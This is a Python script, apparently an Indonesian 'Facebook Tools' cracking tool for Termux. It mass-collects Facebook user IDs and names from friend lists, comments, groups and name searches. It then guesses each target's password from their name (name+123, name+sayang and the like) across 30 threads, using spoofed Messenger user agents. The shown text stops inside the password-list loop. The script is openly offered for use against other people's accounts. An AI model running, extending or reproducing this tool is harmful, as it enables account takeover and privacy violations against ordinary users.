#Yang Recode Anak Haram
#Coder By LuciverXD
#Githuber LuciverXD Ari Marshello
#𝙇𝙪𝙘𝙞𝙫𝙚𝙧XD><

import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess, base64
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import date,datetime
from requests.exceptions import ConnectionError
ses = requests.Session()


from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()


M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
U2 = "[#AF00FF]" # UNGU
O2 = "[#FF8F00]" # ORANGE
P = "\x1b[1;97m"
M = "\x1b[1;91m"
H = "\x1b[1;92m"
K = "\x1b[1;93m"
B = "\x1b[1;94m"
U = "\x1b[1;95m" 
O = "\x1b[1;96m"
N = "\x1b[0m"    
Z = "\033[1;30m"
sir = "\033[41m\x1b[1;97m"
x = "\33[m" # DEFAULT
m = "\x1b[1;91m" #RED +
k = "\033[93m" # KUNING +
h = "\x1b[1;92m" # HIJAU +
hh = "\033[32m" # HIJAU -
u = "\033[95m" # UNGU
kk = "\033[33m" # KUNING -
b = "\x1b[0;34m" # BIRU -
p = "\x1b[0;34m" # BIRU +

sekarang = calendar.timegm(time.gmtime(time.time()))
tampung = []
ugent = []
sys.stdout.write('\x1b]2; LeonzzXD B Api All SIM Python 3.1\x07')

try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00FF00]"
	color_panel = "#AF00FF"


android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
try:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
except:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
versi_app = str(random.randint(111111111,999999999))

for z in range(200):
	versi_android = str(random.randint(4,12))+".0.0"
	versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
	device = random.choice(["Nexus 5 Build/NHG47L","Nexus 7 Build/LMY47V","Nexus 5X Build/N4F26T","Nexus 6P Build/OPM5.171019.014","Nexus 5X Build/OPR6.170623.023","Nexus 6 Build/OPM5.171019.015","Nexus 5X Build/MMB29K","Nexus 5X Build/OPM6.171019.030.H1","Lenovo TB-X704L Build/NMF26F","SM-N986U Build/RP1A.200720.012","Venue 7 3730 Build/KOT49H","Redmi Note 8 Pro Build/PPR1.180610.011","Note 7 Pro Build/PKQ1.181203.001","EML-L29 Build/HUAWEIEML-L29","vivo 1724 Build/OPM1.171019.011","MAR-LX1B Build/HUAWEIMAR-L21B","Redmi 4A Build/N2G47H","S2 Build/2.130VE.30.c","RMX1821 Build/QP1A.190711.020","SM-M146B Build/TP1A.220624.014","SM-M146B Build/TP1A.220624.014","SM-S908U Build/TP1A.220624.014","SM-M307F Build/RP1A.200720.012","SM-E135F Build/TP1A.220624.014","SM-G975F Build/QP1A.190711.020","SM-M326B Build/RP1A.200720.012","SM-A716U Build/TP1A.220624.014"])
	dev = device.split(" Build/")[0]
	az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
	build = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
	versi = random.choice(["11_7_7","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	verchrome = random.choice(["602.1.50","602.2.14","602.3.12","602.4.6","603.1.30","604.4.7","603.3.8","601.1.46"])
	mob = random.choice(["14A456","14B100","14C92","14D27","14E304","14F89","14G60","13C75","13D15","13E233","13E238","13F69","13G34","13G36"])
	useragent = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/72.0 Mobile/17G80 Safari/605.1.15","Mozilla/5.0 (Linux; U; Android 4.4.4; zh-CN;HM 2A Build/KTU84Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.2.936 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; iQOO U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 6.0.1; Hongmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.4137.146 Mobile Safari/537.36 OPR/53.0.3847.46","Mozilla/5.0 (Linux; Android 10; Redmi K30S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Mobile Safari/537.36 EdgA/89.0.774.50","Mozilla/5.0 (Linux; Android 8.1; RX17Neo) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.108 Mobile Safari/537.36","Mozilla/5.0 (iPad; CPU OS 9_3_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/76.0 Mobile/13G35 Safari/605.1.15","Mozilla/5.0 (Linux; Andr0id 9; BRAVIA 2K GB ATV3 Build/PTT1.190515.001.S54) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36 OPR/46.0.2207.0 OMI/4.13.5.431.DIA5HBBTV.250 Model/Sony-BRAVIA-2K-GB-ATV3","Mozilla/5.0 (Linux; Android 4.4.2; Brace-X1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Redmi Note9S Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36","Mozilla/5.0 (iPad; CPU OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/72.0 Mobile/15F79 Safari/605.1.15","Mozilla/5.0 (Linux; Android 8.1; R15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; TANK2) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; Hisense U60 Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; TECNO CK8n) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.193 Mobile Safari/537.36 OPR/79.3.4195.76674",
"Mozilla/5.0 (Linux; Android 11; K9 Pro 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Mobile Safari/537.36 EdgA/90.0.818.62","Mozilla/5.0 (iPad; CPU OS 11_2_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/72.0 Mobile/15D100 Safari/605.1.15","Mozilla/5.0 (iPhone; CPU iPhone OS 10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12. Mobile/16A404 Safari/600.1.4 baidubrowser/4.14.1.11 (Baidu; P2 12.0.1)","Mozilla/5.0 (Linux; U; Android 12; tr-tr; Redmi Note 11R Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 XiaoMi/MiuiBrowser/14.1.1-gn","Mozilla/5.0 (Linux; Android 10; NNH-AN00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36","Mozilla/5.0 (Linux; arm; Android 10; EBG-AN10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4725.1 YaApp_Android/21.82.1 YaSearchBrowser/21.82.1 BroPP/1.0 SA/3 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-N950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.28 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 11; ru-ru; Redmi 9T Build/RKQ1.201004.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.3.1-gn",
"Mozilla/5.0 (Linux; Android 8.1.0; SM-J530FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4862.128 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; Infinix X693) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4711.1 Safari/537.36 OPR/73.0.3856.438","Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 DuckDuckGo/5 Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36 OPR/68.3.3557.64528","Mozilla/5.0 (Linux; Android 9; SM-G950U Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/255.0.0.33.121;]","Mozilla/5.0 (Linux; Android 7.1.1; SM-J700T Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.111 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/266.0.0.64.124;]","Mozilla/5.0 (Linux; Android 8.1.0; vivo 1726 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.117 Mobile Safari/537.36 GSA/10.96.12.21.arm64","Mozilla/5.0 (Linux; Android 5.1.1; LGL82VL Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]",
"Mozilla/5.0 (Linux; Android 10; SM-G975W Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.111 Mobile Safari/537.36 GSA/11.5.9.21.arm64"])
	ua = f"{useragent} [FBAN/MessengerLite;FBAV/{versi_chrome};FBBV/193013937;FBDM/"+"{density=2.625,width=1080,height=1794};"+f"FBLC/en_US;FBRV/0;FBCR/Verizon;FBMF/Google;FBBD/google;FBPN/com.facebook.mlite;FBDV/Pixel 2;FBSV/{versi_android};FBBK/1;FBOP/1;FBCA/arm64-v8a:;"
	if ua in ugent:pass
	else:ugent.append(ua)
	

class Logo:
	
	def bersihkan_layar(self):
		if "linux" in sys.platform.lower():
			try:os.system("clear")
			except:pass
		elif "win" in sys.platform.lower():
			try:os.system("cls")
			except:pass
		else:
			try:os.system("clear") 
			except:pass

	
	def logonya(self):
		self.bersihkan_layar()
		prints(Panel(f"""{color_text} {M2}● ● ●
     _____                              _____                             
  __|_    |__  __   _  ______  ____  __|  _  |__  ____    ______  __  __  
 |    |      ||  | | ||   ___||    ||  |_| |    ||    \  |   ___||  |/ /  
 |    |_     ||  |_| ||   |__ |    ||   _  |    ||     \ |   |__ |     \  {P2}
 |______|  __||______||______||____||__| |_|  __||__|\__\|______||__|\__\ 
    |_____|                            |_____|                            
                       {H2} 𝕄𝕒𝕕𝕖 𝔹𝕪 {M2}LEONZZ XD{P2}ℂ𝕠𝕕𝕖𝕣                                                     """,width=80,title=f"{H2} • LeonzzXD • ",style=f"{color_panel}"))
	

class Login:
	
	
	def __init__(self):
		self.ip = ses.get("http://ip-api.com/json/").json()["query"]
		self.negara = ses.get("http://ip-api.com/json/").json()["country"]

	
	def menu_login(self):		
		Logo().logonya()
		luci = []
		bang = []
		self.menu = Console()
		self.tol = Console()
		luci.append(Panel(f'{P2}[{H2}•{P2}]{P2}Nama    : {H2}LeonzzXD\n{P2}[{H2}•{P2}]{P2}Github  : {H2}LeonzzXD\n{P2}[{H2}•{P2}]{P2}Negara  : {H2}{self.negara}\n{P2}[{H2}•{P2}]{P2}Script  : {H2}Facebook Tools',width=40,padding=(0,2),title=f"{H2}Pengguna",style=f"{color_panel}"))
		luci.append(Panel(f'{P2}[{H2}•{P2}]{P2}Lisensi : {H2}1 minggu\n{P2}[{H2}•{P2}]{P2}Join    : {H2}- -\n{P2}[{H2}•{P2}]{P2}Tools   : {H2}Termux X Linux\n{P2}[{H2}•{P2}]{P2}Versi : {M2}Free',width=40,padding=(0,2),title=f"{H2}Lisensi",style=f"{color_panel}"))
		self.menu.print(Columns(luci))
		prints(Panel(f"""{P2}[{color_text}01{P2}]. Login Dengan Cookie
[{color_text}02{P2}]. Login {M2}Email Dan Password""",width=40,padding=(0,2),style=f"{color_panel}"))
		login = console.input(f" {H2}• {P2}Pilih : ")
		if login in["1","01"]:
			prints(Panel(f"""{P2}Masukan Cookie Yang Baik Dan Benar Sesuaikan Akun Tumbal Dan Fresh""",width=80,style=f"{color_panel}"))
			cookie = console.input(f" {H2}• {P2}Cookie: {H2}")
			#open("data/cookie","w").write(cookie)
			self.login_cookie(cookie)
		else:
			exit(prints(Panel(f"""{M2} Fitur Belum Di Update""",width=80,style=f"{color_panel}")))
			
	
	def login_cookie(self,cookie):
		try:
			url = ses.get("https://mbasic.facebook.com/",cookies={"cookie": cookie}).text
			if "Apa yang Anda pikirkan sekarang" in url:
				pass
			else:
				for z in url.find_all("a",href=True):
					if "Tidak, Terima Kasih" in z.text:
						get = ses.get("https://mbasic.facebook.com"+z["href"],cookies={"cookie": cookie})
						parsing = parser(get.text,"html.parser")
						action = parsing.find("form",{"method":"post"})["action"]
						data = {
							"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(get.text)).group(1),
							"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
							"submit": "OK, Gunakan Data"
						}
						post = ses.post("https://mbasic.facebook.com"+action,data=data,cookies={"cookie": cookie})
						break
			open("data/cookie","w").write(cookie)
			Menu().menu()
		except:
			prints(Panel(f"""{M2}ᴄᴏᴏᴋɪᴇᴍᴜ ᴍᴏᴅᴀʀ ɢᴏʙʟᴏᴋ""",width=80,style=f"{color_panel}"))
			sys.exit()
		
	
	def ubah_bahasa(self,cookie):
		try:
			url = ses.get("https://mbasic.facebook.com/language/",cookies={"cookie": cookie})
			parsing = parser(url.text,"html.parser")
			for x in parsing.find_all("form",{"method":"post"}):
				if "Bahasa Indonesia" in str(x):
					data = {
						"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),
						"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),
						"submit"  : "Bahasa Indonesia"
					}
					post = ses.post("https://mbasic.facebook.com"+x["action"],data=data,cookies={"cookie": cookie})
		except:
			pass
		

class Menu:
	
	
	def __init__(self):
		self.men = []
		self.id = []
		self.ip = ses.get("http://ip-api.com/json/").json()["query"]
		self.negara = ses.get("http://ip-api.com/json/").json()["country"]

	
	def cek_login(self,cookie):
		try:
			url = ses.get("https://mbasic.facebook.com/profile.php",cookies=cookie).text
			nama = re.findall("<title>(.*?)</title>",url)[0]
			if "Konten Tidak Ditemukan" in nama:
				try:os.remove("data/cookie")
				except:pass
				Login().menu_login()
			else:
				return nama
		except ConnectionError:
			prints(Panel(f"""{M2}ᴋᴏɴᴇᴋꜱɪ ᴊᴇʟᴇᴋ,ʜᴀʀᴀᴘ ᴅᴜᴅᴜᴋ ᴅɪ ᴀᴛᴀꜱ ᴛᴏᴡᴇʀ""",width=80,style=f"{color_panel}"))
			exit()
			
	
	def menu(self):
		
		Logo().logonya()
		
		
		try:
			cok = open("data/cookie","r").read()
			cookie = {"cookie": cok}
			nama = self.cek_login(cookie)
		except:
			try:os.remove("data/cookie")
			except:pass
			Login().menu_login()
		
		
		luci = []
		bang = []
		self.menu = Console()
		self.tol = Console()
		luci.append(Panel(f'{P2}[{H2}•{P2}]{P2}Nama    : {H2}{nama}\n{P2}[{H2}•{P2}]{P2}IP      : {H2}{self.ip}\n{P2}[{H2}•{P2}]{P2}Negara  : {H2}{self.negara}\n{P2}[{H2}•{P2}]{P2}Script  : {H2}Facebook Tools',width=40,padding=(0,2),title=f"{H2}Pengguna",style=f"{color_panel}"))
		luci.append(Panel(f'{P2}[{H2}•{P2}]{P2}lisensi : {H2}.*****.*...\n{P2}[{H2}•{P2}]{P2}join    : {H2}- -\n{P2}[{H2}•{P2}]{P2}tools   : {H2}Termux X Linux\n{P2}[{H2}•{P2}]{P2}premium : {M2}Yes',width=40,padding=(0,2),title=f"{H2}Lisensi",style=f"{color_panel}"))
		self.menu.print(Columns(luci))
		bang.append(Panel(f"{P2}[{color_text}01{P2}]. Crack Publik\n{P2}[{color_text}02{P2}]. Crack Pengikut\n{P2}[{color_text}03{P2}]. Crack Komentar\n{P2}[{color_text}04{P2}]. Crack Random Email",width=40,padding=(0,2),style=f"{color_panel}"))
		bang.append(Panel(f"{P2}[{color_text}05{P2}]. Crack Random Username\n{P2}[{color_text}06{P2}]. Crack Pencarian Nama\n{P2}[{color_text}07{P2}]. Crack Member Group\n{P2}[{color_text}08{P2}]. Crack File",width=40,padding=(0,2),style=f"{color_panel}"))
		self.tol.print(Columns(bang))
		prints(Panel(f""".            {P2}Ketikan{H2} RAL{P2} Menuju Menu RAL Yang Lainya""",width=80,padding=(0,6),title=f"{H2} • Menu RAL • ",style=f"{color_panel}"))
		menu = console.input(f" {H2}➢ {P2}pilih menu : ")
		
		
		if menu in["1","01"]:
			prints(Panel(f"""          {P2}Silahkan Masukan UID Target Yang Sesuai Dan Tidak Private""",subtitle=f"{P2}Ketik {H2}Ainx{P2} Untuk Dump Pertemanan Sendiri ",width=80,style=f"{color_panel}"))
			user = console.input(f" {H2}• {P2}Masukan UID : ")
			if user in["Ainx","ainx"]:
				user = Dump(cookie).GetUser()
			Dump(cookie).Dump_Publik(f"https://mbasic.facebook.com/{user}?v=friends")
			Crack().atursandi()
			
		
		elif menu in["3","03"]:
			prints(Panel(f"""{P2}masukan id postingan, pastikan postingan bersifat publik dan tidak private""",width=80,style=f"{color_panel}"))
			user = console.input(f" {H2}• {P2}masukan id postingan : ")
			Dump(cookie).Dump_Komentar(f"https://mbasic.facebook.com/{user}")
			Crack().atursandi()
			
		
		elif menu in["4","04"]:
			prints(Panel(f"""{P2}masukan nama dan format email gunakan '@' di awal contoh @gmail.com""",width=80,style=f"{color_panel}"))
			user = console.input(f" {H2}• {P2}masukan nama : ")
			format = console.input(f" {H2}• {P2}masukan format : ")
			limit = console.input(f" {H2}• {P2}masukan limit : ")
			Dump(cookie).Dump_Email(user,format,limit)
			Crack().atursandi()
			
		
		elif menu in["5","05"]:
			prints(Panel(f"""{P2}masukan nama dan jika 2 kata bisa gunakan titik '.' sebagai pemisah""",width=80,style=f"{color_panel}"))
			user = console.input(f" {H2}• {P2}masukan nama : ")
			limit = console.input(f" {H2}• {P2}masukan limit : ")
			Dump(cookie).Dump_Username(user,limit)
			Crack().atursandi()
			
		
		elif menu in["6","06"]:
			prints(Panel(f"""{P2}kamu bisa menggunakan koma (,) sebagai pemisah jika lebih dari 1 nama""",width=80,style=f"{color_panel}"))
			user = console.input(f" {H2}• {P2}masukan nama : ")
			common = open("asset/nama_indonesia","r").read().splitlines()
			for idt in user.split(","):
				self.id.append(idt)
				for people in common:
					self.id.append(people+" "+idt)
			try:
				for gas in self.id:
					Dump(cookie).Dump_Pencarian(f"https://mbasic.facebook.com/public/{gas}")
			except:pass
			Crack().atursandi()
		
		
		elif menu in["7","07"]:
			prints(Panel(f"""{P2}masukan id grup, pastikan grup bersifat publik dan tidak private""",width=80,style=f"{color_panel}"))
			user = console.input(f" {H2}• {P2}masukan id grup : ")
			Dump(cookie).Dump_MemberGrup(f"https://mbasic.facebook.com/groups/{user}")
			Crack().atursandi()
			
	
		elif menu in["8","08"]:
			prints(Panel(f"""{P2}masukan tempat file, pastikan izin ke penyimpanan sudah diaktifkan""",width=80,style=f"{color_panel}"))
			user = console.input(f" {H2}• {P2}masukan tempat file : ")
			Dump(cookie).Dump_File(user)
			Crack().atursandi()

		
		elif menu in["BOT","Bot","bot"]:
			exit(prints(Panel(f"""{M2}sorry belum gua update""",width=80,style=f"{color_panel}")))
			
		
		elif menu in["RAL","Ral","ral"]:
			Lain(cookie).menu()
			
		else:
			exit(prints(Panel(f"""{M2}sorry belum gua update""",width=80,style=f"{color_panel}")))
			

class Dump:
	
	
	def __init__(self,cookie):
		self.cookie = cookie
			
	
	def GetUser(self):
		try:
			url = ses.get("https://mbasic.facebook.com/profile.php",cookies=self.cookie).text
			uid = re.findall('name="target" value="(.*?)"',url)[0]
			return uid
		except:
			pass

	
	def Dump_Publik(self,url):
		try:
			url = parser(ses.get(url,cookies=self.cookie).text,"html.parser")
			for z in url.find_all("a",href=True):
				if "fref" in z.get("href"):
					if "/profile.php?id=" in z.get("href"):uid = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",z.get("href")));nama = z.text
					else:uid = "".join(bs4.re.findall("/(.*?)\?",z.get("href")));nama = z.text
					if uid+"<=>"+nama in tampung:pass
					else:tampung.append(uid+"<=>"+nama)
					console.print(f" {H2}• {P2}Proses Sukses, Berhasil Tampung {len(tampung)} UID....", end="\r")
			for x in url.find_all("a",href=True):
				if "Lihat Teman Lain" in x.text:
					self.Dump_Publik("https://mbasic.facebook.com/"+x.get("href"))
		except:pass
			
	
	def Dump_Komentar(self,url):
		try:
			data = parser(ses.get(url).text,"html.parser")
			for isi in data.find_all("h3"):
				for ids in isi.find_all("a",href=True):
					if "profile.php" in ids.get("href"):uid = ids.get("href").split('=')[1].replace("&refid","")
					else:uid = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
					nama = ids.text
					if uid+"<=>"+nama in tampung:pass
					else:tampung.append(uid+"<=>"+nama)
					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
			for z in data.find_all("a",href=True):
				if "Lihat komentar sebelumnya…" in z.text:
					self.Dump_Komentar("https://mbasic.facebook.com"+z["href"])
		except:pass
		
	
	def Dump_Pencarian(self,url):
		try:
			data = parser(ses.get(str(url)).text,'html.parser')
			for z in data.find_all("td"):
				namp = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(z))
				for uid,nama in namp:
					if "profile.php?" in uid:uid = re.findall("id=(.*)",str(uid))[0]
					elif "<span" in nama:nama = re.findall("(.*?)\<",str(nama))[0]
					if uid+"<=>"+nama in tampung:pass
					else:tampung.append(uid+"<=>"+nama)
					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
			for x in data.find_all("a",href=True):
				if "Lihat Hasil Selanjutnya" in x.text:
					self.Dump_Pencarian(x.get("href"))
		except:pass
		
	
	def Dump_MemberGrup(self,url):
		try:
			data = parser(ses.get(url,cookies=self.cookie,headers={"user-agent": "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"}).text, "html.parser")
			judul = re.findall("<title>(.*?)</title>",str(data))[0]
			for isi in data.find_all("h3"):
				for ids in isi.find_all("a",href=True):
					if "profile.php" in ids.get("href"):uid = ids.get("href").split("=")[1].replace("&eav","");nama = ids.text
					else:
						if ids.text==judul:pass
						else:uid = ids.get("href").split("/")[1].split("?")[0];nama = ids.text
					if uid+"<=>"+nama in tampung:pass
					else:tampung.append(uid+"<=>"+nama)
					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
			for x in data.find_all("a",href=True):
				if "Lihat Postingan Lainnya" in x.text:
					self.Dump_MemberGrup("https://mbasic.facebook.com"+x.get("href"))
		except:pass
		
	
	def Dump_File(self,lok):
		try:
			file = open(lok,"r").read().splitlines()
			for z in file:
				tampung.append(z)
		except:pass
		
	
	def Dump_Email(self,nama,format,limit):
		try:
			for z in range(int(limit)):
				if len(nama.split()) > 1:
					email = str(nama.split()[0])+str(nama.split()[1])+str(z)+str(format)+"<=>"+str(nama.split()[0])+" "+str(nama.split()[1])
				else:
					email = str(nama)+str(z)+str(format)+"<=>"+str(nama)
				if email in tampung:pass
				else:tampung.append(email)
		except:pass
		
	
	def Dump_Username(self,nama,limit):
		try:
			for z in range(int(limit)):
				if "." in nama:
					user = str(nama)+"."+str(z)+"<=>"+str(nama.replace("."," "))
				else:
					user = str(nama)+"."+str(z)+"<=>"+str(nama)
				if user in tampung:pass
				else:tampung.append(user)
		except:pass


class Crack:
	
	
	def __init__(self):
		self.loop = 0
		self.ok = []
		self.cp = []
		self.apk = []
		self.aktif = []
		self.kadaluwarsa = []
		self.hari_ini = datetime.now().strftime("%d-%B-%Y")
		
	
	def atursandi(self):
		prints(Panel(f"""          {P2}Total {len(tampung)} id""",width=80,padding=(0,21),style=f"{color_panel}"))
		luci = []
		bang = []
		self.menu = Console()
		self.tol = Console()
		luci.append(Panel(f'{H2}    ➢ • {P2}Ingin Manual Ketik\n            [{H2}Y {P2}atau {H2}y {P2}]',width=40,padding=(0,2),title=f"{H2}Manual",style=f"{color_panel}"))
		luci.append(Panel(f'{H2}    ➢ • {P2}Ingin Otomatis Ketik\n            {P2}[{M2}N {P2}atau {M2}n {P2}]',width=40,padding=(0,2),title=f"{H2}Otomatis",style=f"{color_panel}"))
		self.menu.print(Columns(luci))
		set = console.input(f" {H2}➢ {P2}Pilih : ")
		
		
		if set in["Y","y"]:
			prints(Panel(f"""{P2}silahkan buat katasandi dengan , (koma) sebagai pemisah tiap katasandi""",width=80,style=f"{color_panel}"))
			pwx = console.input(f" {H2}• {P2}buat katasandi : ").split(",")
			if len(pwx)<=5:
				prints(Panel(f"""{M2}katasandi harus minimal 6 huruf""",width=80,style=f"{color_panel}"))
				exit()
			prints(Panel(f"""{P2}memunculkan aplikasi bisa membuat akun terkena checkpoint/dinonaktifkan""",width=80,style=f"{color_panel}"))
			app = console.input(f" {H2}• {P2}apakah kamu ingin memunculkan aplikasi terkait?(y/n) : ")
			if app in["Y","y"]:
				self.apk.append("muncul")
			else:
				self.apk.append("kontol anjing")
			self.manual(pwx)
		
		
		else:
			luci = []
			bang = []
			self.menu = Console()
			self.tol = Console()
			luci.append(Panel(f'{H2}➢ • {P2}Online [ {H2}Y{P2} ]\n{H2}➢ • {P2}Offline [ {M2}N {P2}]',width=40,padding=(0,2),title=f"{H2}Setting Apk",style=f"{color_panel}"))
			self.menu.print(Columns(luci))
			app = console.input(f" {H2}➢ {P2}Pilih : ")
			if app in["Y","y"]:
				self.apk.append("muncul")
			else:
				self.apk.append("kontol anjing")
			self.otomatis()
		
	
	def manual(self,pw):
		global prog,des
		prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
		des = prog.add_task('',total=len(tampung))
		with prog:
			with ThreadPoolExecutor(max_workers=30) as fall:
				self.simpan_hasil()
				for data in tampung:
					user = data.split("<=>")[0]
					nama = data.split("<=>")[1]
					pwx = pw
					fall.submit(self.metode_api,user,pwx)
		prints(Panel(f"""{P2}berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=80,padding=(0,8),style=f"{color_panel}"))
		prints(Panel(f"""{H2}➢ •{P2}Gagal {M2}Cinta {P2}Karna Cita²Itu {H2}Wajar{P2},Gagal Cita² Karna Cinta Itu Kurang {M2}Ajar""",width=40,padding=(0,10),title=f"{H2} • Quotes LeonzzXD • ",style=f"{color_panel}"))
		sys.exit()
						
	
	def otomatis(self):
		global prog,des
		prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
		des = prog.add_task('',total=len(tampung))
		with prog:
			with ThreadPoolExecutor(max_workers=30) as fall:
				self.simpan_hasil()
				for data in tampung:
					try:
						pwx = []
						user = data.split("<=>")[0]
						nama = data.split("<=>")[1]
						depan = nama.split(" ")[0]
						if len(nama)<=5:
							if len(depan)<3:
								pass 
							else:
								pwx.append(depan+"123")
								pwx.append(depan+" 1234") 
								pwx.append(depan+"12345")
						else:
							if len(depan)<3:
								pwx.append(nama)
							else:
								pwx.append(nama)
								pwx.append(depan+"123")
								pwx.append(depan+" 1234") 
								pwx.append(depan+"12345")
								pwx.append(depan+"321")
								pwx.append(depan+"01")
								pwx.append(depan+"02")
								pwx.append(depan+"03")
								pwx.append(depan+"04")
								pwx.append(depan+"05")
								pwx.append(depan+"06")
								pwx.append(depan+"sayang")
								pwx.append(depan+"kata sandi")
							belakang = nama.split(" ")[1]
							if len(belakang)<3:
								pwx.append(depan+belakang)
							else:
								pwx.append(depan+belakang)
								pwx.append(belakang+"123")
								pwx.append(belakang+" 1234") 
